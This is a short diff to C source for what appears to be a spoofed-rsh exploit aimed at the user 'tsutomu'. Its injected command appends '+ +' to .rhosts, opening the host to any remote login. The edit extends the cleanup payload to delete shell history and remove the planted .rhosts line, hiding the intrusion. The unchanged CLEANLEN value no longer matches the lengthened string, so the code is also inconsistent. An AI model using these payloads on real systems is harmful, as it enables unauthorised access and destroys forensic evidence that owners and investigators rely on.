@@ -16,7 +16,7 @@
 #define DSTPORT 514
 #define EXPLOIT "0\0tsutomu\0tsutomu\0echo + + >> .rhosts"
 #define EXPLOITLEN 38
-#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history"
+#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history || sed -i '$ d' .rhosts"
 #define CLEANLEN 40
 
 void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
